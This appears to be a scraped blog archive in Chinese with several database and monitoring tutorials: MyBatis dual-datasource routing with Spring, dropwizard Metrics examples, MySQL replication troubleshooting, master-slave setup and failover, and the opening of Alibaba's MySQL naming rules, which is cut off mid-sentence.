value=\"${jdbc.defaultAutoCommit}\"/&gt; &lt;property name=\"removeAbandoned\" value=\"${jdbc.removeAbandoned}\"/&gt; &lt;property name=\"removeAbandonedTimeout\" value=\"${jdbc.removeAbandonedTimeout}\"/&gt; &lt;property name=\"testWhileIdle\" value=\"${jdbc.testWhileIdle}\"/&gt; &lt;property name=\"timeBetweenEvictionRunsMillis\" value=\"${jdbc.timeBetweenEvictionRunsMillis}\"/&gt; &lt;property name=\"numTestsPerEvictionRun\" value=\"${jdbc.numTestsPerEvictionRun}\"/&gt; &lt;property name=\"minEvictableIdleTimeMillis\" value=\"${jdbc.minEvictableIdleTimeMillis}\"/&gt; &lt;/bean&gt; &lt;bean id=\"multipleDataSource\" class=\"com.cnblogs.lzrabbit.MultipleDataSource\"&gt; &lt;property name=\"defaultTargetDataSource\" ref=\"mySqlDataSource\"/&gt; &lt;property name=\"targetDataSources\"&gt; &lt;map&gt; &lt;entry key=\"mySqlDataSource\" value-ref=\"mySqlDataSource\"/&gt; &lt;entry key=\"sqlServerDataSource\" value-ref=\"sqlServerDataSource\"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"multipleDataSource\"/&gt; &lt;/bean&gt; &lt;!-- mybatis.spring自动映射 --&gt; &lt;bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt; &lt;property name=\"basePackage\" value=\"com.cnblogs.lzrabbit\"/&gt; &lt;/bean&gt; &lt;!-- 自动扫描，多个包以 逗号分隔 --&gt; &lt;context:component-scan base-package=\"com.cnblogs.lzrabbit\"/&gt; &lt;aop:aspectj-autoproxy/&gt;&lt;/beans&gt; MultipleDataSource实现12345678910111213141516171819package com.cnblogs.lzrabbit;import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;/** * Created by rabbit on 14-5-25. */public class MultipleDataSource extends AbstractRoutingDataSource { private static final ThreadLocal&lt;String&gt; dataSourceKey = new InheritableThreadLocal&lt;String&gt;(); public static void setDataSourceKey(String dataSource) { dataSourceKey.set(dataSource); } @Override protected Object determineCurrentLookupKey() { return dataSourceKey.get(); }} 手动数据源切换调用12345678910111213141516171819202122232425package com.cnblogs.lzrabbit;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;/** * Created by rabbit on 14-5-25. */public class Main { public static void main(String[] args) { //初始化ApplicationContext ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); MySqlMapper mySqlMapper = applicationContext.getBean(MySqlMapper.class); SqlServerMapper sqlServerMapper = applicationContext.getBean(SqlServerMapper.class); //设置数据源为MySql,使用了AOP测试时请将下面这行注释 MultipleDataSource.setDataSourceKey(\"mySqlDataSource\"); mySqlMapper.getList(); //设置数据源为SqlServer,使用AOP测试时请将下面这行注释 MultipleDataSource.setDataSourceKey(\"sqlServerDataSource\"); sqlServerMapper.getList(); }} MyBatis接口Mapper定义，直接使用注解方式实现123456789public interface MySqlMapper { @Select(\"select * from MyTable\") List&lt;Map&lt;String,Object&gt;&gt; getList();}public interface SqlServerMapper { @Select(\"select * from MyTable\") List&lt;Map&lt;String,Object&gt;&gt; getList();} 使用SpringAOP方式实现自动切换123456789101112131415161718192021package com.cnblogs.lzrabbit;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.springframework.stereotype.Component;@Component@Aspectpublic class MultipleDataSourceAspectAdvice { @Around(\"execution(* com.cnblogs.lzrabbit.*.*(..))\") public Object doAround(ProceedingJoinPoint jp) throws Throwable { if (jp.getTarget() instanceof MySqlMapper) { MultipleDataSource.setDataSourceKey(\"mySqlDataSource\"); } else if (jp.getTarget() instanceof SqlServerMapper) { MultipleDataSource.setDataSourceKey(\"sqlServerDataSource\"); } return jp.proceed(); }}配置详解这里就上面的实现做个简单解释，在我们配置单数据源时可以看到数据源类型使用了org.apache.commons.dbcp.BasicDataSource，而这个代码实现了javax.sql.DataSource接口 配置sqlSessionFactory时org.mybatis.spring.SqlSessionFactoryBean注入参数dataSource类型就是javax.sql.DataSource 实现多数据源的方法就是我们自定义了一个MultipleDataSource，这个类继承自AbstractRoutingDataSource，而AbstractRoutingDataSource继承自AbstractDataSource ，AbstractDataSource 实现了javax.sql.DataSource接口，所以我们的MultipleDataSource也实现了javax.sql.DataSource接口，可以赋值给sqlSessionFactory的dataSource属性 12345public abstract class AbstractRoutingDataSource extends AbstractDataSource implements InitializingBean {}public abstract class AbstractDataSource implements DataSource {} 再来说下MultipleDataSource的实现原理，MultipleDataSource实现AbstractRoutingDataSource抽象类，然后实现了determineCurrentLookupKey方法，这个方法用于选择具体使用targetDataSources中的哪一个数据源123456789&lt;bean id=\"multipleDataSource\" class=\"com.cnblogs.lzrabbit.MultipleDataSource\"&gt; &lt;property name=\"defaultTargetDataSource\" ref=\"mySqlDataSource\"/&gt; &lt;property name=\"targetDataSources\"&gt; &lt;map&gt; &lt;entry key=\"mySqlDataSource\" value-ref=\"mySqlDataSource\"/&gt; &lt;entry key=\"sqlServerDataSource\" value-ref=\"sqlServerDataSource\"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; 可以看到Spring配置中multipleDataSource设置了两个属性defaultTargetDataSource和targetDataSources，这两个属性定义在AbstractRoutingDataSource，当MyBatis执行查询时会先选择数据源，选择顺序时现根据determineCurrentLookupKey方法返回的值到targetDataSources中去找，若能找到怎返回对应的数据源，若找不到返回默认的数据源defaultTargetDataSource，具体参考AbstractRoutingDataSource的源码12345678910111213141516171819202122232425262728293031323334353637383940public abstract class AbstractRoutingDataSource extends AbstractDataSource implements InitializingBean { private Map&lt;Object, Object&gt; targetDataSources; private Object defaultTargetDataSource; /** * Retrieve the current target DataSource. Determines the * {@link #determineCurrentLookupKey() current lookup key}, performs * a lookup in the {@link #setTargetDataSources targetDataSources} map, * falls back to the specified * {@link #setDefaultTargetDataSource default target DataSource} if necessary. * @see #determineCurrentLookupKey() */ protected DataSource determineTargetDataSource() { Assert.notNull(this.resolvedDataSources, \"DataSource router not initialized\"); Object lookupKey = determineCurrentLookupKey(); DataSource dataSource = this.resolvedDataSources.get(lookupKey); if (dataSource == null &amp;&amp; (this.lenientFallback || lookupKey == null)) { dataSource = this.resolvedDefaultDataSource; } if (dataSource == null) { throw new IllegalStateException(\"Cannot determine target DataSource for lookup key [\" + lookupKey + \"]\"); } return dataSource; } /** * Determine the current lookup key. This will typically be * implemented to check a thread-bound transaction context. * &lt;p&gt;Allows for arbitrary keys. The returned key needs * to match the stored lookup key type, as resolved by the * {@link #resolveSpecifiedLookupKey} method. */ protected abstract Object determineCurrentLookupKey(); .............}在动态切换数据源方法时选择了AOP方式实现，这里实现的简单粗暴，具体应用时根据实际需要灵活变通吧","link":"/2016/10/20/MyBatis%E5%8F%8C%E6%95%B0%E6%8D%AE%E6%BA%90/"},{"title":"Metrics","text":"系统开发到一定的阶段，线上的机器越来越多，就需要一些监控了，除了服务器的监控，业务方面也需要一些监控服务。Metrics作为一款监控指标的度量类库，提供了许多工具帮助开发者来完成自定义的监控工作。 举个例子，一个图片压缩服务： 每秒钟的请求数是多少（TPS）？ 平均每个请求处理的时间？ 请求处理的最长耗时？ 等待处理的请求队列长度？ 又或者一个缓存服务： 缓存的命中率？ 平均查询缓存的时间？ 基本上每一个服务、应用都需要做一个监控系统，这需要尽量以少量的代码，实现统计某类数据的功能。 以Java为例，目前最为流行的metrics库是来自Coda Hale 的 dropwizard/metrics，该库被广泛地应用于各个知名的开源项目中。例如 Hadoop，Kafka，Spark，JStorm 中。 本文就结合范例来主要介绍下 dropwizard/metrics 的概念和用法。 Maven 配置我们需要在pom.xml中依赖 metrics-core 包：1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;io.dropwizard.metrics&lt;/groupId&gt; &lt;artifactId&gt;metrics-core&lt;/artifactId&gt; &lt;version&gt;${metrics.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;注：在POM文件中需要声明 ${metrics.version} 的具体版本号，如 3.1.0 Metric RegistriesMetricRegistry类是Metrics的核心，它是存放应用中所有metrics的容器。也是我们使用 Metrics 库的起点。 1MetricRegistry registry = new MetricRegistry(); 每一个 metric 都有它独一无二的名字，Metrics 中使用句点名字，如 com.example.Queue.size。当你在 com.example.Queue 下有两个 metric 实例，可以指定地更具体：com.example.Queue.requests.size 和 com.example.Queue.response.size 。使用MetricRegistry类，可以非常方便地生成名字。 12MetricRegistry.name(Queue.class, \"requests\", \"size\")MetricRegistry.name(Queue.class, \"responses\", \"size\") Metrics 数据展示Metircs 提供了 Report 接口，用于展示 metrics 获取到的统计数据。metrics-core中主要实现了四种 reporter： JMX, console, SLF4J, 和 CSV。 在本文的例子中，我们使用 ConsoleReporter 。 五种 Metrics 类型Gauges最简单的度量指标，只有一个简单的返回值，例如，我们想衡量一个待处理队列中任务的个数，代码如下：1234567891011121314151617181920212223public class GaugeTest { public static Queue&lt;String&gt; q = new LinkedList&lt;String&gt;(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); registry.register(MetricRegistry.name(GaugeTest.class, \"queue\", \"size\"), new Gauge&lt;Integer&gt;() { public Integer getValue() { return q.size(); } }); while(true){ Thread.sleep(1000); q.add(\"Job-xxx\"); } }} 运行之后的结果如下：123-- Gauges ------------------------------------------------com.alibaba.wuchong.metrics.GaugeTest.queue.size value = 6 其中第7行和第8行添加了ConsoleReporter，可以每秒钟将度量指标打印在屏幕上，理解起来会更清楚。 但是对于大多数队列数据结构，我们并不想简单地返回queue.size()，因为java.util和java.util.concurrent中实现的#size()方法很多都是 O(n) 的复杂度，这会影响 Gauge 的性能。 CountersCounter 就是计数器，Counter 只是用 Gauge 封装了 AtomicLong 。我们可以使用如下的方法，使得获得队列大小更加高效。 12345678910111213141516171819202122232425262728293031323334353637383940public class CounterTest { public static Queue&lt;String&gt; q = new LinkedBlockingQueue&lt;String&gt;(); public static Counter pendingJobs; public static Random random = new Random(); public static void addJob(String job) { pendingJobs.inc(); q.offer(job); } public static String takeJob() { pendingJobs.dec(); return q.poll(); } public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); pendingJobs = registry.counter(MetricRegistry.name(Queue.class,\"pending-jobs\",\"size\")); int num = 1; while(true){ Thread.sleep(200); if (random.nextDouble() &gt; 0.7){ String job = takeJob(); System.out.println(\"take job : \"+job); }else{ String job = \"Job-\"+num; addJob(job); System.out.println(\"add job : \"+job); } num++; } }} 运行之后的结果大致如下： 123456789add job : Job-15add job : Job-16take job : Job-8take job : Job-10add job : Job-1915-8-1 16:11:31 ============================================-- Counters ----------------------------------------------java.util.Queue.pending-jobs.size count = 5 MetersMeter度量一系列事件发生的速率(rate)，例如TPS。Meters会统计最近1分钟，5分钟，15分钟，还有全部时间的速率。123456789101112131415161718192021222324252627282930public class MeterTest { public static Random random = new Random(); public static void request(Meter meter){ System.out.println(\"request\"); meter.mark(); } public static void request(Meter meter, int n){ while(n &gt; 0){ request(meter); n--; } } public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,\"request\",\"tps\")); while(true){ request(meterTps,random.nextInt(5)); Thread.sleep(1000); } }} 运行结果大致如下： 12345678910request15-8-1 16:23:25 ============================================-- Meters ------------------------------------------------com.alibaba.wuchong.metrics.MeterTest.request.tps count = 134 mean rate = 2.13 events/second 1-minute rate = 2.52 events/second 5-minute rate = 3.16 events/second 15-minute rate = 3.32 events/second 注：非常像 Unix 系统中 uptime 和 top 中的 load。 HistogramsHistogram统计数据的分布情况。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, 和 99.9百分位的值(percentiles)。 比如request的大小的分布：123456789101112131415161718public class HistogramTest { public static Random random = new Random(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir()); registry.register(MetricRegistry.name(HistogramTest.class, \"request\", \"histogram\"), histogram); while(true){ Thread.sleep(1000); histogram.update(random.nextInt(100000)); } }} 运行之后结果大致如下： 12345678910111213-- Histograms --------------------------------------------java.util.Queue.queue.histogram count = 56 min = 1122 max = 99650 mean = 48735.12 stddev = 28609.02 median = 49493.00 75% &lt;= 72323.00 95% &lt;= 90773.00 98% &lt;= 94011.00 99% &lt;= 99650.00 99.9% &lt;= 99650.00 TimersTimer其实是 Histogram 和 Meter 的结合， histogram 某部分代码/调用的耗时， meter统计TPS。 123456789101112131415161718192021public class TimerTest { public static Random random = new Random(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,\"get-latency\")); Timer.Context ctx; while(true){ ctx = timer.time(); Thread.sleep(random.nextInt(1000)); ctx.stop(); } }} 运行之后结果如下： 1234567891011121314151617-- Timers ------------------------------------------------com.alibaba.wuchong.metrics.TimerTest.get-latency count = 38 mean rate = 1.90 calls/second 1-minute rate = 1.66 calls/second 5-minute rate = 1.61 calls/second 15-minute rate = 1.60 calls/second min = 13.90 milliseconds max = 988.71 milliseconds mean = 519.21 milliseconds stddev = 286.23 milliseconds median = 553.84 milliseconds 75% &lt;= 763.64 milliseconds 95% &lt;= 943.27 milliseconds 98% &lt;= 988.71 milliseconds 99% &lt;= 988.71 milliseconds 99.9% &lt;= 988.71 milliseconds 其他初次之外，Metrics还提供了HealthCheck 用来检测某个某个系统是否健康，例如数据库连接是否正常。还有Metrics Annotation，可以很方便地实现统计某个方法，某个值的数据。感兴趣的可以点进链接看看。 使用经验总结一般情况下，当我们需要统计某个函数被调用的频率（TPS），会使用Meters。当我们需要统计某个函数的执行耗时时，会使用Histograms。当我们既要统计TPS又要统计耗时时，我们会使用Timers。 参考资料Metrics CoreMetrics Getting Started","link":"/2016/09/12/Metrics/"},{"title":"MySQL主从同步报错故障处理集锦","text":"前言在发生故障切换后，经常遇到的问题就是同步报错，下面是最近收集的报错信息。 记录删除失败在master上删除一条记录，而slave上找不到1234Last_SQL_Error: Could not execute Delete_rows event on table hcy.t1; Can't find record in 't1', Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event's master log mysql-bin.000006, end_log_pos 254 解决方法：master要删除一条记录，而slave上找不到报错，这种情况主都已经删除了，那么从机可以直接跳过。123stop slave;set global sql_slave_skip_counter=1;start slave;如果这种情况很多，需要针对这种错误专门写相关脚本。 主键重复在slave已经有该记录，又在master上插入了同一条记录。1234Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; Duplicate entry '2' for key 'PRIMARY', Error_code: 1062; handler error HA_ERR_FOUND_DUPP_KEY; the event's master log mysql-bin.000006, end_log_pos 924解决方法： 在slave上用desc hcy.t1; 先看下表结构：1234567mysql&gt; desc hcy.t1;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | NO | PRI | 0 | | | name | char(4) | YES | | NULL | | +-------+---------+------+-----+---------+-------+删除重复的主键123456789101112mysql&gt; delete from t1 where id=2;Query OK, 1 row affected (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;……Slave_IO_Running: YesSlave_SQL_Running: Yes……mysql&gt; select * from t1 where id=2;在master上和slave上再分别确认一下。 更新丢失在master上更新一条记录，而slave上找不到，丢失了数据。12345Last_SQL_Error: Could not execute Update_rows event on table hcy.t1; Can't find record in 't1', Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event's master log mysql-bin.000010, end_log_pos 794解决方法： 在master上，用mysqlbinlog 分析下出错的binlog日志在干什么。1234567891011121314151617/usr/local/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A '10' 794#120302 12:08:36 server id 22 end_log_pos 794 Update_rows: table id 33 flags: STMT_END_F### UPDATE hcy.t1### WHERE### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2='bbc' /* STRING(4) meta=65028 nullable=1 is_null=0 */### SET### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2='BTV' /* STRING(4) meta=65028 nullable=1 is_null=0 */# at 794#120302 12:08:36 server id 22 end_log_pos 821 Xid = 60COMMIT/*!*/;DELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/; 在slave上，查找下更新后的那条记录，应该是不存在的。12mysql&gt; select * from t1 where id=2;Empty set (0.00 sec)然后再到master查看1234567mysql&gt; select * from t1 where id=2;+----+------+| id | name |+----+------+| 2 | BTV | +----+------+1 row in set (0.00 sec)把丢失的数据在slave上填补，然后跳过报错即可。123456789101112131415161718192021mysql&gt; insert into t1 values (2,'BTV');Query OK, 1 row affected (0.00 sec)mysql&gt; select * from t1 where id=2; +----+------+| id | name |+----+------+| 2 | BTV | +----+------+1 row in set (0.00 sec)mysql&gt; stop slave ;set global sql_slave_skip_counter=1;start slave;Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.00 sec)Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;…… Slave_IO_Running: Yes Slave_SQL_Running: Yes…… 1236错误, 二进制文件缺失误删二进制文件等各种原因，导致主库mysql-bin.000012文件丢失，从库同步失败。1234Master_Log_File: mysql-bin.000012Slave_IO_Running: NoSlave_SQL_Running: YesLast_IO_Error: Got fatal error 1236 from master when reading data from binary log: 'Could not find first log file name in binary log index file' 首先停止从库同步1slave stop; 查看主库日志文件和位置123456mysql&gt; show master logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000013 | 154 |+------------------+-----------+ 回从库，使日志文件和位置对应主库1CHANGE MASTER TO MASTER_LOG_FILE='log-bin.000013',MASTER_LOG_POS=154; 最后，启动从库：12345678slave start;show slave status\\G;Master_Log_File: mysql-bin.000013Slave_IO_Running: YesSlave_SQL_Running: YesLast_IO_Error: 中继日志损坏slave的中继日志relay-bin损坏。123Last_SQL_Error: Error initializing relay log position: I/O error reading the header from the binary logLast_SQL_Error: Error initializing relay log position: Binlog has bad magic number; It's not a binary log file that can be used by this version of MySQL 1、手工修复解决方法：找到同步的binlog和POS点，然后重新做同步，这样就可以有新的中继日值了。 例子：123456789101112131415161718192021222324252627mysql&gt; show slave status\\G;*************************** 1. row *************************** Master_Log_File: mysql-bin.000010 Read_Master_Log_Pos: 1191 Relay_Log_File: vm02-relay-bin.000005 Relay_Log_Pos: 253 Relay_Master_Log_File: mysql-bin.000010 Slave_IO_Running: Yes Slave_SQL_Running: No Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 1593 Last_Error: Error initializing relay log position: I/O error reading the header from the binary log Skip_Counter: 1 Exec_Master_Log_Pos: 821Slave_IO_Running ：接收master的binlog信息 Master_Log_File Read_Master_Log_PosSlave_SQL_Running：执行写操作 Relay_Master_Log_File Exec_Master_Log_Pos 以执行写的binlog和POS点为准。12Relay_Master_Log_File: mysql-bin.000010Exec_Master_Log_Pos: 821 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000010',MASTER_LOG_POS=821;Query OK, 0 rows affected (0.01 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.8.22 Master_User: repl Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000010 Read_Master_Log_Pos: 1191 Relay_Log_File: vm02-relay-bin.000002 Relay_Log_Pos: 623 Relay_Master_Log_File: mysql-bin.000010 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1191 Relay_Log_Space: 778 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: 2、Ibbackup各种大招都用上了，无奈slave数据丢失过多，ibbackup（需要银子）该你登场了。 Ibbackup热备份工具，是付费的。xtrabackup是免费的，功能上一样。 Ibbackup备份期间不锁表，备份时开启一个事务（相当于做一个快照），然后会记录一个点，之后数据的更改保存在ibbackup_logfile文件里，恢复时把ibbackup_logfile 变化的数据再写入到ibdata里。 Ibbackup 只备份数据（ ibdata、.ibd ），表结构.frm不备份。","link":"/2017/01/15/MySQL%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E6%8A%A5%E9%94%99%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E9%9B%86%E9%94%A6/"},{"title":"MySQL主从搭建","text":"主服务器: 192.168.1.100从服务器: 192.168.1.101 主服务器配置1、编辑配置文件 1234567891011121314151617181920212223242526272829303132333435# 如果不存在，就手动创建一个vim /etc/my.cnf在配置文件加入如下值：[mysqld] # 唯一的服务辨识号,数值位于 1 到 2^32-1之间.# 此值在master和slave上都需要设置.# 如果 “master-host” 没有被设置,则默认为1, 但是如果忽略此选项,MySQL不会作为master生效.server-id=1# 打开二进制日志功能.# 在复制(replication)配置中,作为 MASTER 主服务器必须打开此项# 如果你需要从你最后的备份中做基于时间点的恢复,你也同样需要二进制日志. log-bin=master-binlog-bin-index=master-bin.index# 以下为非必须设置的选项# 表明距离当前时间正好n天前的二进制文件会被系统自动删除# 二进制文件千万不要手动删除expire-logs-days=14# binlog有三种日志格式, Statement、Row、Mixed, mysql默认采用statement, 建议使用mixedbinlog_format=mixed# sync_binlog=0，当事务提交之后，MySQL不做fsync之类的磁盘同步指令刷新binlog_cache中的信息到磁盘，而让Filesystem自行决定什么时候来做同步，或者cache满了之后才同步到磁盘。# sync_binlog=n，当每进行n次事务提交之后，MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘# 设置为0和设置为1的系统写入性能差距有时候高达5倍甚至更多。sync-binlog=1# 单个日志文件最大字节设置最大100MB（单位：字节） # 日志默认值是1GB，由于事务，一般文件都大于1GBmax_binlog_size=104857600 #需要备份的数据库 binlog-do-db=orders#不需要备份的数据库#若没有配置binlog-do-db和binlog_ignore_db，表示备份全部数据库。binlog-ignore-db=mysql 2、重启mysqld服务1service mysqld restart 3、为从MySQL创建用户123456789#登录mysql -uroot -pEnter password: #创建用户mysql&gt; create user 'mast_repl'@'192.168.1.101(从机ip)' identified by '123456'; #配置主从复制权限mysql&gt; grant replication slave on *.* to 'mast_repl'@'192.168.1.101(从机ip)' identified by '123456'; 4、若orders中已有数据，还需要锁定主服务器数据库，然后将数据导入到从数据库12345678910111213#锁定mysql&gt; flush tables with read lock;#数据复制到从数据库后，查看主数据库master状态并解锁：mysql&gt; show master status; +------------------+----------+--------------+------------------+-------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set | +------------------+----------+--------------+------------------+-------------------+ | mysql-bin.000003 | 2005 | orders | mysql | | +------------------+----------+--------------+------------------+-------------------+ 1 row in set (0.00 sec) mysql&gt; unlock tables; 从服务器配置1、配置服务ID12345678910111213141516171819vim /etc/my.cnf [mysqld]#server_id是必须的，而且唯一server-id=2# 使得slave只读.只有用户拥有SUPER权限和在上面的slave线程能够修改数据.# 你可以使用此项去保证没有应用程序会意外的修改slave而不是master上的数据#read_only# 如果你在使用链式从服务器结构的复制模式 (A-&gt;B-&gt;C),# 需要打开slave的二进制日志#log_bin=mysql-bin# 如果你在使用链式从服务器结构的复制模式 (A-&gt;B-&gt;C),# 你需要在服务器B上打开此项.# 此选项打开在从线程上重做过的更新的日志, 并将其写入从服务器的二进制日志.# 如果打开log_bin，却没有设置log_slave_updates，这是一种错误的配置。#log_slave_updates 2、重启MySQL服务1service mysqld restart 3、配置复制123456789101112#登录mysql -uroot -pEnter password: #执行mysql&gt; change master to master_host='192.168.1.100', master_user='mast_repl', master_password='123456', master_port=3306, master_log_file='mysql-bin.000003', master_log_pos=2005, master_connect_retry=10; 参数详解：master_host:主服务器的IP。master_user：配置主服务器时建立的用户名master_password：用户密码master_port：主服务器mysql端口，如果未曾修改，默认即可。master_log_file：日志文件名称，填写查看master状态时显示的Filemaster_log_pos：日志位置，填写查看master状态时显示的Positionmaster_connect_retry：重连次数 4、启动进程1mysql&gt; start slave; 5、检查主从复制状态123456789101112131415mysql&gt; show slave status\\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.1.100 Master_User: mast_repl Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000003 Read_Master_Log_Pos: 2369 Relay_Log_File: jhq0113-relay-bin.000002 Relay_Log_Pos: 647 Relay_Master_Log_File: mysql-bin.000003 Slave_IO_Running: Yes Slave_SQL_Running: Yes ... 若Slave_IO_Running和Slave_SQL_Running均为Yes，则表示配置成功。 常见配置错误Q：报错如下123 Slave_IO_Running: ConnectingSlave_SQL_Running: Yes Last_IO_Error: error connecting to master 'mast_repl@192.168.1.100:3306' - retry-time: 10 retries: 66A：可能原因如下1、mast_repl用户没有复制权限，在主库通过【show grants for ‘mast_repl’@’192.168.1.100’】命令查询。2、change master to命令中的master_password错误，即mast_repl用户密码错误。3、change master to命令中的master_log_pos错误，在主库通过【show master status】命名查询。 主从复制原理MySQL主从复制过程主要由三个线程来完成。其中两个线程(Sql线程和IO线程)在Slave端，另外一个线程(IO线程)在Master端。 Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容； Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置； Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我” Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的。 主从切换主变从，从变主主服务器: 192.168.1.101从服务器: 192.168.1.100 1234567891011121314151617181920212223242526272829303132333435# 准备工作1、确认从库是否已经同步完成。在原有的从机101上，通过命令【show slave status\\G;】查看【Slave_SQL_Running_State】的状态是否为【Slave has read all relay log; waiting for more updates】。2、打开从库的binlog相关配置，注释掉主库的binlog配置。3、在从库创建账号并赋予复制的权限create user 'mastj'@'192.168.1.100(新的从机ip)' identified by '123456';grant replication slave on *.* to 'mastj'@'192.168.1.100(新的从机ip)' identified by '123456';FLUSH PRIVILEGES;# 从变主(以下为101上的操作)4、停止从库的复制。stop slave。5、换从库为主库RESET MASTER6、重启服务器，查看主状态，记录File和Position值。service mysql restartshow master status;+-------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------+----------+--------------+------------------+-------------------+| master-bin.000001 | 154 | 略 | mysql | |+-------------------+----------+--------------+------------------+-------------------+# 主变从(以下为100上的操作)7、RESET SLAVE;8、change master to master_host='192.168.1.101', master_user='mast_repl', master_password='123456', master_port=3306, master_log_file='mysql-bin.000001', master_log_pos=154, master_connect_retry=10;9、重启数据库，并检查Slave_IO_Running和Slave_SQL_Running的值。如果都为yes，表名主从切换成功service mysql restartshow slave status; 链接相关mysql中文手册http://doc.mysql.cn/mysql5/refman-5.1-zh.html-chapter/ my.cnf参数详解https://my.oschina.net/eduosi/blog/270535 线上MySQL主从同步报错故障处理总结http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html Mysql主从架构的复制原理http://blog.csdn.net/hguisu/article/details/7325124 不同场景下 MySQL 的迁移方案https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes","link":"/2016/10/07/MySQL%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/"},{"title":"MySQL规约（阿里巴巴）","text":"建表规约 【强制】表达是与否概念的字段，必须使用 is _ xxx 的方式命名，数据类型是 unsigned tinyint（ 1 表示是，0 表示否 ） ，此规则同样适用于 odps 建表。说明：任何字段如果为非负数，必须是 unsigned 。 【强制】表名、字段名必须使用小写字母或数字 ； 